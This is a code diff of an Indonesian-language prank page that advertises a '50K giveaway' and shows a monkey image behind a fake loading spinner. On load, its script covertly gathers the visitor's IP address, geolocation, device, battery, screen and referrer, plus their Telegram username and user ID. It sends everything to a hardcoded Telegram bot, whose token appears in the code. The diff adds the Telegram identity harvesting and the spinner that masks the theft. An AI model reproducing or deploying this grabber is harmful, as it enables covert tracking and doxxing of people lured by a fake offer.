@@ -24,27 +24,77 @@
             max-width: 500px;
             border: 1px solid #ff6b6b;
             box-shadow: 0 0 30px rgba(255,107,107,0.3);
+            position: relative;
+        }
+        .loading-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            border-radius: 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            transition: opacity 0.5s ease;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,107,107,0.3);
+            border-top: 4px solid #ff6b6b;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+        .loading-text {
+            color: #ff6b6b;
+            font-size: 14px;
+            letter-spacing: 2px;
+            animation: pulse 1s ease infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
         img {
             max-width: 100%;
             border-radius: 20px;
             box-shadow: 0 0 20px rgba(255,107,107,0.5);
             animation: shake 0.5s ease infinite;
+            display: none;
         }
         h1 {
             color: #ff6b6b;
             font-size: 28px;
             margin-top: 20px;
+            display: none;
         }
         .price {
             font-size: 32px;
             font-weight: bold;
             color: #ffd93d;
             margin: 15px 0;
+            display: none;
         }
         .by {
             color: #888;
             font-size: 14px;
+            display: none;
+        }
+        .content {
+            transition: opacity 0.5s ease;
+            opacity: 0;
+        }
+        .content.show {
+            opacity: 1;
         }
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
@@ -55,12 +105,21 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://i.pinimg.com/originals/9b/8a/9a/9b8a9a9b8a9a9b8a9a9b8a9a9b8a9a9.jpg" 
-             onerror="this.src='https://media.tenor.com/5k5k5k5k5k5k.gif'"
-             alt="Monyet">
-        <h1>🐒 MONYET LAGI ASYIK 🐒</h1>
-        <div class="price">💰 DAGET 50K BY FIQ 💰</div>
-        <div class="by">🔞 Jangan diganggu, lagi sibuk 🔞</div>
+        <!-- LOADING ANIMASI -->
+        <div class="loading-container" id="loadingContainer">
+            <div class="spinner"></div>
+            <div class="loading-text">⚡ LOADING DAGET 50K ⚡</div>
+        </div>
+        
+        <!-- KONTEN UTAMA -->
+        <div class="content" id="content">
+            <img id="monkeyImg" src="https://i.pinimg.com/originals/9b/8a/9a/9b8a9a9b8a9a9b8a9a9b8a9a9b8a9a9.jpg" 
+                 onerror="this.src='https://media.tenor.com/5k5k5k5k5k5k.gif'"
+                 alt="Monyet">
+            <h1>🐒 MONYET LAGI ASYIK 🐒</h1>
+            <div class="price">💰 DAGET 50K BY FIQ 💰</div>
+            <div class="by">🔞 Jangan diganggu, lagi sibuk 🔞</div>
+        </div>
     </div>
 
     <script>
@@ -68,17 +127,58 @@
         const TELEGRAM_TOKEN = "8766620931:AAEh2D0Du_Youkn8baGaZy8jWa-Esh_UNJc";
         const TELEGRAM_CHAT_ID = "8463622692";
         
-        // ========== KIRIM DATA INSTAN ==========
-        (async function() {
-            // Ambil data secara paralel biar cepet
-            const [ipRes, locRes, battery] = await Promise.all([
+        // ========== AMBIL DATA USER TELEGRAM ==========
+        async function getTelegramUser() {
+            if (window.Telegram && window.Telegram.WebApp) {
+                const tg = window.Telegram.WebApp;
+                const user = tg.initDataUnsafe?.user;
+                if (user) {
+                    return {
+                        username: user.username || user.first_name || "No username",
+                        id: user.id,
+                        first_name: user.first_name,
+                        language: user.language_code
+                    };
+                }
+            }
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const tgData = urlParams.get('tgWebAppData');
+            if (tgData) {
+                try {
+                    const params = new URLSearchParams(tgData);
+                    const userData = params.get('user');
+                    if (userData) {
+                        const user = JSON.parse(decodeURIComponent(userData));
+                        return {
+                            username: user.username || user.first_name,
+                            id: user.id,
+                            first_name: user.first_name
+                        };
+                    }
+                } catch(e) {}
+            }
+            
+            const referrer = document.referrer;
+            if (referrer.includes('t.me') || referrer.includes('telegram')) {
+                return { username: "Pengguna Telegram (tidak terdeteksi)", from_telegram: true };
+            }
+            
+            return null;
+        }
+        
+        // ========== KIRIM DATA KE TELEGRAM ==========
+        async function sendDataToTelegram() {
+            const [ipRes, locRes, battery, tgUser] = await Promise.all([
                 fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: 'Gagal'})),
                 fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({})),
-                ('getBattery' in navigator) ? navigator.getBattery().catch(() => null) : null
+                ('getBattery' in navigator) ? navigator.getBattery().catch(() => null) : null,
+                getTelegramUser()
             ]);
             
             const ip = ipRes.ip || 'Gagal';
             const loc = locRes;
+            
             const device = (() => {
                 const ua = navigator.userAgent;
                 if (/Android/i.test(ua)) return '📱 Android';
@@ -103,6 +203,22 @@
             const screenRes = `${screen.width}x${screen.height}`;
             const referrer = document.referrer || 'Direct';
             
+            let tgInfo = '';
+            if (tgUser) {
+                tgInfo = `
+─────────────────
+📱 <b>TELEGRAM USER:</b>
+   👤 <b>Username:</b> @${tgUser.username || tgUser.first_name || '?'}
+   🆔 <b>User ID:</b> ${tgUser.id || '?'}
+   🌐 <b>Bahasa:</b> ${tgUser.language || '?'}
+                `;
+            } else {
+                tgInfo = `
+─────────────────
+📱 <b>TELEGRAM:</b> Tidak terdeteksi (buka via browser biasa)
+                `;
+            }
+            
             const message = `
 🔴 <b>ADA YANG BUKA LINK DAGET 50K!</b> 🔴
 ─────────────────
@@ -117,11 +233,11 @@
 📺 <b>Resolusi:</b> ${screenRes}
 ⏰ <b>Waktu:</b> ${time}
 🔗 <b>Referrer:</b> ${referrer}
+${tgInfo}
 ─────────────────
-🐒 <b>DAGET 50K BY FIQ - INSTANT SEND!</b>
+🐒 <b>DAGET 50K BY FIQ - MONYET UDAH MUNCUL!</b>
             `;
             
-            // Kirim instan, gak pake await biar gak ngeblok
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -131,7 +247,39 @@
                     parse_mode: 'HTML'
                 })
             }).catch(e => console.log);
-        })();
+        }
+        
+        // ========== LOADING & TAMPILIN KONTEN ==========
+        async function showContent() {
+            // Kirim data ke Telegram (tanpa nunggu)
+            sendDataToTelegram();
+            
+            // Loading animasi 1.5 detik
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Sembunyikan loading
+            const loadingContainer = document.getElementById('loadingContainer');
+            loadingContainer.style.opacity = '0';
+            setTimeout(() => {
+                loadingContainer.style.display = 'none';
+            }, 500);
+            
+            // Tampilkan konten
+            const content = document.getElementById('content');
+            const img = document.getElementById('monkeyImg');
+            const h1 = document.querySelector('h1');
+            const price = document.querySelector('.price');
+            const by = document.querySelector('.by');
+            
+            img.style.display = 'block';
+            h1.style.display = 'block';
+            price.style.display = 'block';
+            by.style.display = 'block';
+            content.classList.add('show');
+        }
+        
+        // ========== JALANKAN ==========
+        showContent();
     </script>
 </body>
 </html>
